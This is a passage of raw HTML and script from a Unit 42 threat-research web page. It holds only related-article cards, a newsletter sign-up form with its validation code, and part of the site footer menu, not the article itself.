                    Read now                    <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-right-arrow-withtail.svg" alt="Right arrow">
                  </a>
                </div>
              </div>
            </div>
                                <div class="pa l-card l-card--slider" >
              <div class="card-media " >
                              <figure>
                <img width="786" height="368" data-src="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/11/08_Nation-State-cyberattacks_1920x900-786x368.jpg" class="lozad" alt="Pictorial representation of global companies paying North Korean IT workers. Abstract digital world map with interconnected lines and dots, depicting global data and network connections, highlighted in blue and red colors." decoding="async" data-srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/11/08_Nation-State-cyberattacks_1920x900-786x368.jpg 786w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/11/08_Nation-State-cyberattacks_1920x900-1493x700.jpg 1493w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/11/08_Nation-State-cyberattacks_1920x900-768x360.jpg 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/11/08_Nation-State-cyberattacks_1920x900-1536x720.jpg 1536w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/11/08_Nation-State-cyberattacks_1920x900.jpg 1920w" sizes="(max-width: 786px) 100vw, 786px" />                </figure> 
                            </div>
              <div class="card-content">
                <div class="card-content__wrapper">
                  <a class="card-category" href="https://unit42.paloaltonetworks.com/category/threat-research/" role="link" data-page-track="true" data-page-track-value="unit42-smoking-rarog-mining-trojan:related-resources:Global Companies Are Unknowingly Paying North Koreans: Here’s How to Catch Them:Threat Research"><span class=""><img class="lozad" data-src="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/icon-threat-research.svg" alt=" category icon">Threat Research</span></a>                        <span class="post-pub-date"><time datetime="2024-11-13T11:00:36+00:00">November 13, 2024</time></span>
                  <a href="https://unit42.paloaltonetworks.com/north-korean-it-workers/" data-page-track="true" data-page-track-value="unit42-smoking-rarog-mining-trojan:related-resources:Global Companies Are Unknowingly Paying North Koreans: Here’s How to Catch Them">
                    <h4 class="post-title">Global Companies Are Unknowingly Paying North Koreans: Here’s How to Catch Them</h4>
                  </a>
                  <ul class="card-tags" role="list">
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/advanced-persistent-threat/" title="Advanced Persistent Threat" role="link" data-page-track="true" data-page-track-value="unit42-smoking-rarog-mining-trojan:related-resources:Global Companies Are Unknowingly Paying North Koreans: Here’s How to Catch Them:Advanced Persistent Threat">Advanced Persistent Threat</a>
				</li>
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/dprk/" title="DPRK" role="link" data-page-track="true" data-page-track-value="unit42-smoking-rarog-mining-trojan:related-resources:Global Companies Are Unknowingly Paying North Koreans: Here’s How to Catch Them:DPRK">DPRK</a>
				</li>
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/north-korea/" title="North Korea" role="link" data-page-track="true" data-page-track-value="unit42-smoking-rarog-mining-trojan:related-resources:Global Companies Are Unknowingly Paying North Koreans: Here’s How to Catch Them:North Korea">North Korea</a>
				</li></ul>                </div>
                <div class="card-content__link">
                                    <a class="hyperlink" href="https://unit42.paloaltonetworks.com/north-korean-it-workers/" title="Global Companies Are Unknowingly Paying North Koreans: Here’s How to Catch Them" role="link" data-page-track="true" data-page-track-value="unit42-smoking-rarog-mining-trojan:related-resources:Global Companies Are Unknowingly Paying North Koreans: Here’s How to Catch Them:read now">
                    Read now                    <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-right-arrow-withtail.svg" alt="Right arrow">
                  </a>
                </div>
              </div>
            </div>
                                <div class="pa l-card l-card--slider" >
              <div class="card-media " >
                              <figure>
                <img width="786" height="368" data-src="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/11/11_Cybercrime_Category_1920x900-786x368.jpg" class="lozad" alt="A pictorial represntation of cybercrime like Silent Skimmer. A glowing red padlock on a wet surface with red particles floating in a misty, dark blue background." decoding="async" data-srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/11/11_Cybercrime_Category_1920x900-786x368.jpg 786w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/11/11_Cybercrime_Category_1920x900-1493x700.jpg 1493w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/11/11_Cybercrime_Category_1920x900-768x360.jpg 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/11/11_Cybercrime_Category_1920x900-1536x720.jpg 1536w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/11/11_Cybercrime_Category_1920x900.jpg 1920w" sizes="(max-width: 786px) 100vw, 786px" />                </figure> 
                            </div>
              <div class="card-content">
                <div class="card-content__wrapper">
                  <a class="card-category" href="https://unit42.paloaltonetworks.com/category/threat-actor-groups/" role="link" data-page-track="true" data-page-track-value="unit42-smoking-rarog-mining-trojan:related-resources:Silent Skimmer Gets Loud (Again):Threat Actor Groups"><span class=""><img class="lozad" data-src="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/07/threat-actor-groups.svg" alt=" category icon">Threat Actor Groups</span></a>                        <span class="post-pub-date"><time datetime="2024-11-07T11:00:13+00:00">November 7, 2024</time></span>
                  <a href="https://unit42.paloaltonetworks.com/silent-skimmer-latest-campaign/" data-page-track="true" data-page-track-value="unit42-smoking-rarog-mining-trojan:related-resources:Silent Skimmer Gets Loud (Again)">
                    <h4 class="post-title">Silent Skimmer Gets Loud (Again)</h4>
                  </a>
                  <ul class="card-tags" role="list">
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/remote-code-execution/" title="Remote Code Execution" role="link" data-page-track="true" data-page-track-value="unit42-smoking-rarog-mining-trojan:related-resources:Silent Skimmer Gets Loud (Again):Remote Code Execution">Remote Code Execution</a>
				</li>
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/python/" title="Python" role="link" data-page-track="true" data-page-track-value="unit42-smoking-rarog-mining-trojan:related-resources:Silent Skimmer Gets Loud (Again):Python">Python</a>
				</li>
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/reverse-shells/" title="reverse shells" role="link" data-page-track="true" data-page-track-value="unit42-smoking-rarog-mining-trojan:related-resources:Silent Skimmer Gets Loud (Again):reverse shells">Reverse shells</a>
				</li></ul>                </div>
                <div class="card-content__link">
                                    <a class="hyperlink" href="https://unit42.paloaltonetworks.com/silent-skimmer-latest-campaign/" title="Silent Skimmer Gets Loud (Again)" role="link" data-page-track="true" data-page-track-value="unit42-smoking-rarog-mining-trojan:related-resources:Silent Skimmer Gets Loud (Again):read now">
                    Read now                    <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-right-arrow-withtail.svg" alt="Right arrow">
                  </a>
                </div>
              </div>
            </div>
                                <div class="pa l-card l-card--slider" >
              <div class="card-media " >
                              <figure>
                <img width="786" height="368" data-src="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/11/02_DNS_Overview_1920x900-786x368.jpg" class="lozad" alt="Pictorial representation of detecting DNS hijacking. Digital illustration of a futuristic data center with glowing blue server racks connected by light beams, surrounded by cloud computing icons, set against a dark background." decoding="async" data-srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/11/02_DNS_Overview_1920x900-786x368.jpg 786w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/11/02_DNS_Overview_1920x900-1493x700.jpg 1493w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/11/02_DNS_Overview_1920x900-768x360.jpg 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/11/02_DNS_Overview_1920x900-1536x720.jpg 1536w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/11/02_DNS_Overview_1920x900.jpg 1920w" sizes="(max-width: 786px) 100vw, 786px" />                </figure> 
                            </div>
              <div class="card-content">
                <div class="card-content__wrapper">
                  <a class="card-category" href="https://unit42.paloaltonetworks.com/category/threat-research/" role="link" data-page-track="true" data-page-track-value="unit42-smoking-rarog-mining-trojan:related-resources:Automatically Detecting DNS Hijacking in Passive DNS:Threat Research"><span class=""><img class="lozad" data-src="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/icon-threat-research.svg" alt=" category icon">Threat Research</span></a>                        <span class="post-pub-date"><time datetime="2024-11-04T23:00:48+00:00">November 4, 2024</time></span>
                  <a href="https://unit42.paloaltonetworks.com/detect-dns-hijacking-passive-dns/" data-page-track="true" data-page-track-value="unit42-smoking-rarog-mining-trojan:related-resources:Automatically Detecting DNS Hijacking in Passive DNS">
                    <h4 class="post-title">Automatically Detecting DNS Hijacking in Passive DNS</h4>
                  </a>
                  <ul class="card-tags" role="list">
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/domain-hijacking/" title="domain hijacking" role="link" data-page-track="true" data-page-track-value="unit42-smoking-rarog-mining-trojan:related-resources:Automatically Detecting DNS Hijacking in Passive DNS:domain hijacking">Domain hijacking</a>
				</li></ul>                </div>
                <div class="card-content__link">
                                    <a class="hyperlink" href="https://unit42.paloaltonetworks.com/detect-dns-hijacking-passive-dns/" title="Automatically Detecting DNS Hijacking in Passive DNS" role="link" data-page-track="true" data-page-track-value="unit42-smoking-rarog-mining-trojan:related-resources:Automatically Detecting DNS Hijacking in Passive DNS:read now">
                    Read now                    <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-right-arrow-withtail.svg" alt="Right arrow">
                  </a>
                </div>
              </div>
            </div>
                                    </div>
    </div>
    <div class="l-container bs__controls">
      <div class="bs__progress"><span></span></div>
      <div class="bs__navigation"> 
        <ul>
          <li> 
            <button id="prevButton"> <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/slider-arrow-left.svg" alt="Slider arrow"></button>
          </li>
          <li> 
            <button id="nextButton"> <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/slider-arrow-left.svg" alt="Slider arrow"></button>
          </li>
        </ul>
      </div>
    </div>
  </div>
 
        <div class="be-enlarge-modal" id="enlargedModal">
          <div class="be-enlarge-modal__wrapper"> 
            <figure> 
              <button class="close__modal" id="closeModal"> 
              <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/close-modal.svg" alt="Close button"></button>
              <img class="be__enlarged-image" id="enlargedImage" src="" alt="Enlarged Image">
              <figcaption> </figcaption>
            </figure>
          </div>
        </div>

      </div>
    </section>
  </main>
<!--  Start: Footer subscription form -->
<div class="newsletter">
      <div class="l-container">
        <div class="newsletter__wrapper">
          <div class="image__wrapper"> 
            <picture>
			                 <source class="lozad" media="(max-width:400px)" data-srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/newsletter-Image-mobile.webp">
			  			                  <source class="lozad" media="(max-width:949px)" data-srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/newsletter-Image-tab.webp">
			  			  			  	<img class="lozad" data-src="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/Revitalized_newsletter-Image-desktop-copy-1.webp" alt="Newsletter">
			              </picture>
          </div>
          <div class="content__wrapper"> 
		    							<span class="pre-title"> 
				<img class="lozad" data-src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/palo-alto-logo-small.svg" alt="UNIT 42 Small Logo">
				Get updates from Unit 42			</span>
						           	 <h2>Peace of mind comes from staying ahead of threats. Contact us today.</h2>
			            <form action="https://www.paloaltonetworks.com/apps/pan/public/formsubmithandler.submitform.json" method="post" novalidate class="subscribe-form" name="Unit42_Subscribe" id="unit42footerSubscription_form">
              <input type="hidden" name="emailFormMask" value="">
              <input type="hidden" value="1086" name="formid">
              <input type="hidden" value="531-OCS-018" name="munchkinId">
              <input type="hidden" value="2141" name="lpId">
              <input type="hidden" value="1203" name="programId">
              <input type="hidden" value="1086" name="formVid">
              <input type="hidden" name="mkto_optinunit42" value="true">
              <input type="hidden" name="mkto_opt-in" value="true">
              <div class="form-group"> 
                <label for="newsletter-email"  id="newsletter-email-label">Your Email</label>
                <input type="emal" placeholder="Your Email" name="Email"  class="subscribe-field" id="newsletter-email" aria-labelledby="newsletter-email-label">
                <p class="error-mail mb-15 text-danger" style="color: #dc3545"></p>
				<p>Subscribe for email updates to all Unit 42 threat research.<br />By submitting this form, you agree to our <a title="Terms of Use" href="https://www.paloaltonetworks.com/legal-notices/terms-of-use" data-page-track="true" data-page-track-value="Get updates from Unit 42:Terms of Use">Terms of Use</a> and acknowledge our <a title="Privacy Statement" href="https://www.paloaltonetworks.com/legal-notices/privacy" data-page-track="true" data-page-track-value="Get updates from Unit 42:Privacy Statement">Privacy Statement.</a></p>
                <div class="g-recaptcha" data-expired-callback="captchaExpires" data-callback="captchaComplete" data-sitekey="6Lc5EhgTAAAAAJa-DzE7EeWABasWg4LKv-R3ao6o"></div>
                <p class="error-recaptcha d-none mt-15 text-danger" style="color: #dc3545">Invalid captcha!</p>
                <button class="l-btn is-disabled" data-page-track="true" data-page-track-value="footer:Get updates from Unit 42:Subscribe" id="unit42footerSubscription_form_button"> 
					Subscribe					<img class="lozad" data-src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/right-arrow.svg" alt="Right Arrow"  class="arrow">
					<img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-loader.svg" alt="loader" class="loader">
			   </button>
				<div class="form-success-message"></div>
              </div>
            </form>
          </div>
        </div>
      </div>
    </div>

<script>

(function($) {
	// Migrated from the unit42-v5 + Modifications
	var subscribeSuccess = false;
	var email = document.getElementById('newsletter-email');
	var subscription_form = document.getElementById('unit42footerSubscription_form');
	var subscription_form_button = document.getElementById('unit42footerSubscription_form_button');
	window.captchaComplete = function() {
		subscribeSuccess = true;
		if ($(mail).val() != '' && isEmail($(mail).val())) {
			$(subscription_form_button).removeClass('is-disabled');
		}
		setTimeout(function() {
			$(email).focus();
			$('.g-recaptcha iframe').attr('tabindex', '-1');
		}, 100)
	}
	window.captchaExpires = function() {
		subscribeSuccess = false;
		$(subscription_form_button).addClass('is-disabled', true);
	} 
	$(subscription_form).submit(function(e) {
		e.preventDefault();
		e.stopImmediatePropagation();
		updateEmailMask();
		var success = true;
		var form = $(this);
		var mail = form.find('input[name="Email"]');
		
		if (mail.val() === '') {
			mail.addClass('has-error');
			showError(1);
			success = false;	
		}  else if (!isEmail(mail.val())){
			showError(2);
			success = false;
		}
		else {
			mail.removeClass('has-error');
			$('.error-mail').addClass('d-none');
		}

		if (!subscribeSuccess) {
			$('.error-recaptcha').removeClass('d-none');
		} else {
			$('.error-recaptcha').addClass('d-none');
		}

		if (success && subscribeSuccess) {
			$.ajax({
				type: 'POST',
				url: form.attr('action'),
				data: form.serialize(),
				beforeSend: function() {
                 form.find('button').addClass('is-loading');
    			},
				success: function(msg) {
					form.find('.form-success-message').html('<p class="success-message">You have been successfully subscribed</p>');
					form.find('button').removeClass('is-loading');
					$(email).val('');
					clearError();
				},
				error: function(jqXHR, textStatus, errorThrown) {
					$(subscription_form_button).addClass('is-disabled', true);
					form.find('button').removeClass('is-loading');
					
				}
			});
		}
		return false;
	});
	function showError(error_type){
		if(error_type == 1) {
			$('.error-mail').text("Please enter the email address.").addClass('error-show');
			$(subscription_form_button).addClass('is-disabled');
		} else if(error_type == 2){
			$('.error-mail').text("Please provide a valid e-mail address.").addClass('error-show');
			$(subscription_form_button).addClass('is-disabled');
		}	
		$(subscription_form_button).removeClass('is-loading');
	}
	function clearError(){
		$('.error-mail').text("").removeClass('error-show');;
		$(subscription_form_button).removeClass('is-loading');
		$(subscription_form_button).removeClass('is-disabled');
	}
	
	$(email).on('input', function (event) { 
		var email = $(this).val();
		if (isEmail(email) ) {			
			clearError();
		} else if(email == ""){
			clearError();
		} else{
			showError(2);			  
		}
    });

	function isEmail(email) {
		var re = /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
		return re.test(String(email).toLowerCase());
	}
	
	var captcha_loaded = false;
         if(!captcha_loaded){
            // recaptcha on foucs call
            $(document).on('change paste keyup', '#newsletter-email', function () {
               if($('.g-recaptcha').hasClass('d-none')){
                $('.g-recaptcha').removeClass('d-none');
               }
               if(!captcha_loaded ){
                  captcha_loaded  = true;
                  // trigger loading api.js (recaptcha.js) script
                  var head = document.getElementsByTagName('head')[0];
                  var script = document.createElement('script');
                  script.type = 'text/javascript';
                  script.src = 'https://www.google.com/recaptcha/api.js?hl=en_US';
                  head.appendChild(script);
               }
            });
        }
	
	function updateEmailMask() {
		var email = $("#unit42footerSubscription_form input[name='Email']").val();
		if (email && email.trim() != '') {
			var maskedEmail = maskEmailAddress(email);
			$("#unit42footerSubscription_form input[name='emailFormMask']").val(maskedEmail);
		}
	}

	function maskEmailAddress (emailAddress) {
		function mask(str) {
			var strLen = str.length;
			if (strLen > 4) {
				return str.substr(0, 1) + str.substr(1, strLen - 1).replace(/\w/g, '*') + str.substr(-1,1);
			}
			return str.replace(/\w/g, '*');
		}
		return emailAddress.replace(/([\w.]+)@([\w.]+)(\.[\w.]+)/g, function (m, p1, p2, p3) {
			return mask(p1) + '@' + mask(p2) + p3;
		});

		return emailAddress;
	}

}(jQuery));
//# sourceMappingURL=main.js.map
	
</script>
<!--  End: Footer subscription form -->

<footer class="footer"> 
  <div class="footer-menu">
    <div class="l-container">
      <div class="footer-menu__wrapper">
        <div class="footer-menu-nav__wrapper">
                      <h3 class="footer-menu-nav__title">Products and services</h3>
                                <div class="nav-column__wrapper"> 
            <div class="nav-column">
              													<nav>
					<ul class="footer-menu-nav__list"> 
																	<li class="footer-menu-nav__item nav-title"> 
							<a href="https://www.paloaltonetworks.com/network-security"   role="link" title="Network Security Platform" data-page-track="true" data-page-track-value="footer:Products and services:Network Security Platform">Network Security Platform</a>
						</li>    
																	<li class="footer-menu-nav__item nav-title"> 
							<a href="https://www.paloaltonetworks.com/network-security/security-subscriptions"   role="link" title="CLOUD DELIVERED SECURITY SERVICES" data-page-track="true" data-page-track-value="footer:Products and services:Network Security Platform:CLOUD DELIVERED SECURITY SERVICES">CLOUD DELIVERED SECURITY SERVICES</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/network-security/advanced-threat-prevention" target=_blank  role="link" title="Advanced Threat Prevention" data-page-track="true" data-page-track-value="footer:Products and services:Network Security Platform:CLOUD DELIVERED SECURITY SERVICES:Advanced Threat Prevention">Advanced Threat Prevention</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/network-security/advanced-dns-security"   role="link" title="DNS Security" data-page-track="true" data-page-track-value="footer:Products and services:Network Security Platform:CLOUD DELIVERED SECURITY SERVICES:Advanced Threat Prevention:DNS Security">DNS Security</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/network-security/enterprise-data-loss-prevention"   role="link" title="Data Loss Prevention" data-page-track="true" data-page-track-value="footer:Products and services:Network Security Platform:CLOUD DELIVERED SECURITY SERVICES:Advanced Threat Prevention:DNS Security:Data Loss Prevention">Data Loss Prevention</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/network-security/enterprise-iot-security"   role="link" title="IoT Security" data-page-track="true" data-page-track-value="footer:Products and services:Network Security Platform:CLOUD DELIVERED SECURITY SERVICES:Advanced Threat Prevention:DNS Security:Data Loss Prevention:IoT Security">IoT Security</a>
						</li>    
					        
					</ul>
				</nav>
																		<nav>
					<ul class="footer-menu-nav__list"> 
																	<li class="footer-menu-nav__item nav-title"> 
							<a href="https://www.paloaltonetworks.com/network-security/next-generation-firewall"   role="link" title="Next-Generation Firewalls" data-page-track="true" data-page-track-value="footer:Products and services:Network Security Platform:CLOUD DELIVERED SECURITY SERVICES:Advanced Threat Prevention:DNS Security:Data Loss Prevention:IoT Security:Next-Generation Firewalls">Next-Generation Firewalls</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/network-security/next-generation-firewall-hardware"   role="link" title="Hardware Firewalls" data-page-track="true" data-page-track-value="footer:Products and services:Network Security Platform:CLOUD DELIVERED SECURITY SERVICES:Advanced Threat Prevention:DNS Security:Data Loss Prevention:IoT Security:Next-Generation Firewalls:Hardware Firewalls">Hardware Firewalls</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/network-security/strata-cloud-manager"   role="link" title="Strata Cloud Manager" data-page-track="true" data-page-track-value="footer:Products and services:Network Security Platform:CLOUD DELIVERED SECURITY SERVICES:Advanced Threat Prevention:DNS Security:Data Loss Prevention:IoT Security:Next-Generation Firewalls:Hardware Firewalls:Strata Cloud Manager">Strata Cloud Manager</a>
						</li>    
					        
					</ul>
				</nav>
																		<nav>
					<ul class="footer-menu-nav__list"> 
																	<li class="footer-menu-nav__item nav-title"> 
							<a href="https://www.paloaltonetworks.com/sase"   role="link" title="SECURE ACCESS SERVICE EDGE" data-page-track="true" data-page-track-value="footer:Products and services:Network Security Platform:CLOUD DELIVERED SECURITY SERVICES:Advanced Threat Prevention:DNS Security:Data Loss Prevention:IoT Security:Next-Generation Firewalls:Hardware Firewalls:Strata Cloud Manager:SECURE ACCESS SERVICE EDGE">SECURE ACCESS SERVICE EDGE</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/sase/access"   role="link" title="Prisma Access" data-page-track="true" data-page-track-value="footer:Products and services:Network Security Platform:CLOUD DELIVERED SECURITY SERVICES:Advanced Threat Prevention:DNS Security:Data Loss Prevention:IoT Security:Next-Generation Firewalls:Hardware Firewalls:Strata Cloud Manager:SECURE ACCESS SERVICE EDGE:Prisma Access">Prisma Access</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/sase/sd-wan"   role="link" title="Prisma SD-WAN" data-page-track="true" data-page-track-value="footer:Products and services:Network Security Platform:CLOUD DELIVERED SECURITY SERVICES:Advanced Threat Prevention:DNS Security:Data Loss Prevention:IoT Security:Next-Generation Firewalls:Hardware Firewalls:Strata Cloud Manager:SECURE ACCESS SERVICE EDGE:Prisma Access:Prisma SD-WAN">Prisma SD-WAN</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/sase/adem"   role="link" title="Autonomous Digital Experience Management" data-page-track="true" data-page-track-value="footer:Products and services:Network Security Platform:CLOUD DELIVERED SECURITY SERVICES:Advanced Threat Prevention:DNS Security:Data Loss Prevention:IoT Security:Next-Generation Firewalls:Hardware Firewalls:Strata Cloud Manager:SECURE ACCESS SERVICE EDGE:Prisma Access:Prisma SD-WAN:Autonomous Digital Experience Management">Autonomous Digital Experience Management</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/sase/next-gen-casb"   role="link" title="Cloud Access Security Broker" data-page-track="true" data-page-track-value="footer:Products and services:Network Security Platform:CLOUD DELIVERED SECURITY SERVICES:Advanced Threat Prevention:DNS Security:Data Loss Prevention:IoT Security:Next-Generation Firewalls:Hardware Firewalls:Strata Cloud Manager:SECURE ACCESS SERVICE EDGE:Prisma Access:Prisma SD-WAN:Autonomous Digital Experience Management:Cloud Access Security Broker">Cloud Access Security Broker</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/sase/ztna"   role="link" title="Zero Trust Network Access" data-page-track="true" data-page-track-value="footer:Products and services:Network Security Platform:CLOUD DELIVERED SECURITY SERVICES:Advanced Threat Prevention:DNS Security:Data Loss Prevention:IoT Security:Next-Generation Firewalls:Hardware Firewalls:Strata Cloud Manager:SECURE ACCESS SERVICE EDGE:Prisma Access:Prisma SD-WAN:Autonomous Digital Experience Management:Cloud Access Security Broker:Zero Trust Network Access">Zero Trust Network Access</a>
						</li>    
					        
					</ul>
				</nav>
						         
            </div>
            <div class="nav-column">
                          													<nav>
					<ul class="footer-menu-nav__list"> 
																	<li class="footer-menu-nav__item nav-title"> 
							<a href="https://www.paloaltonetworks.com/prisma/whyprisma"   role="link" title="Code to Cloud Platform" data-page-track="true" data-page-track-value="footer:Products and services:Code to Cloud Platform">Code to Cloud Platform</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/prisma/cloud"   role="link" title="Prisma Cloud" data-page-track="true" data-page-track-value="footer:Products and services:Code to Cloud Platform:Prisma Cloud">Prisma Cloud</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/content/pan/en_US/prisma/cloud/cloud-native-application-protection-platform"   role="link" title="Cloud-Native Application Protection Platform" data-page-track="true" data-page-track-value="footer:Products and services:Code to Cloud Platform:Prisma Cloud:Cloud-Native Application Protection Platform">Cloud-Native Application Protection Platform</a>
						</li>    
					        
					</ul>
				</nav>
						            </div>
            <div class="nav-column">
              													<nav>
					<ul class="footer-menu-nav__list"> 
																	<li class="footer-menu-nav__item nav-title"> 
							<a href="https://www.paloaltonetworks.com/cortex" target=_blank  role="link" title="AI-Driven Security Operations Platform" data-page-track="true" data-page-track-value="footer:Products and services:AI-Driven Security Operations Platform">AI-Driven Security Operations Platform</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/cortex/cortex-xdr"   role="link" title="Cortex XDR" data-page-track="true" data-page-track-value="footer:Products and services:AI-Driven Security Operations Platform:Cortex XDR">Cortex XDR</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/cortex/cortex-xsoar"   role="link" title="Cortex XSOAR" data-page-track="true" data-page-track-value="footer:Products and services:AI-Driven Security Operations Platform:Cortex XDR:Cortex XSOAR">Cortex XSOAR</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/cortex/cortex-xpanse"   role="link" title="Cortex Xpanse" data-page-track="true" data-page-track-value="footer:Products and services:AI-Driven Security Operations Platform:Cortex XDR:Cortex XSOAR:Cortex Xpanse">Cortex Xpanse</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/cortex/cortex-xsiam"   role="link" title="Cortex XSIAM" data-page-track="true" data-page-track-value="footer:Products and services:AI-Driven Security Operations Platform:Cortex XDR:Cortex XSOAR:Cortex Xpanse:Cortex XSIAM">Cortex XSIAM</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/cortex/cortex-xpanse/attack-surface-management"   role="link" title="External Attack Surface Protection" data-page-track="true" data-page-track-value="footer:Products and services:AI-Driven Security Operations Platform:Cortex XDR:Cortex XSOAR:Cortex Xpanse:Cortex XSIAM:External Attack Surface Protection">External Attack Surface Protection</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/cortex/security-operations-automation"   role="link" title="Security Automation" data-page-track="true" data-page-track-value="footer:Products and services:AI-Driven Security Operations Platform:Cortex XDR:Cortex XSOAR:Cortex Xpanse:Cortex XSIAM:External Attack Surface Protection:Security Automation">Security Automation</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/cortex/detection-and-response"   role="link" title="Threat Prevention, Detection &amp; Response" data-page-track="true" data-page-track-value="footer:Products and services:AI-Driven Security Operations Platform:Cortex XDR:Cortex XSOAR:Cortex Xpanse:Cortex XSIAM:External Attack Surface Protection:Security Automation:Threat Prevention, Detection &amp; Response">Threat Prevention, Detection &amp; Response</a>
						</li>    
					        
					</ul>
				</nav>
						            </div>
            <div class="nav-column">
              													<nav>
					<ul class="footer-menu-nav__list"> 
																	<li class="footer-menu-nav__item nav-title"> 
							<a href="https://www.paloaltonetworks.com/unit42"   role="link" title="Threat Intel and Incident Response Services" data-page-track="true" data-page-track-value="footer:Products and services:Threat Intel and Incident Response Services">Threat Intel and Incident Response Services</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/unit42/assess"   role="link" title="Proactive Assessments" data-page-track="true" data-page-track-value="footer:Products and services:Threat Intel and Incident Response Services:Proactive Assessments">Proactive Assessments</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/unit42/respond"   role="link" title="Incident Response" data-page-track="true" data-page-track-value="footer:Products and services:Threat Intel and Incident Response Services:Proactive Assessments:Incident Response">Incident Response</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/unit42/transform"   role="link" title="Transform Your Security Strategy" data-page-track="true" data-page-track-value="footer:Products and services:Threat Intel and Incident Response Services:Proactive Assessments:Incident Response:Transform Your Security Strategy">Transform Your Security Strategy</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/unit42/threat-intelligence-partners"   role="link" title="Discover Threat Intelligence" data-page-track="true" data-page-track-value="footer:Products and services:Threat Intel and Incident Response Services:Proactive Assessments:Incident Response:Transform Your Security Strategy:Discover Threat Intelligence">Discover Threat Intelligence</a>
						</li>    
					        
					</ul>
				</nav>
						            </div>
          </div>
        </div>
        <div class="footer-menu-nav__wrapper">
                      <h3 class="footer-menu-nav__title">Company</h3>
                                <div class="nav-column__wrapper">
          <div class="nav-column">
            													<nav>
					<ul class="footer-menu-nav__list"> 
																	<li class="footer-menu-nav__item "> 
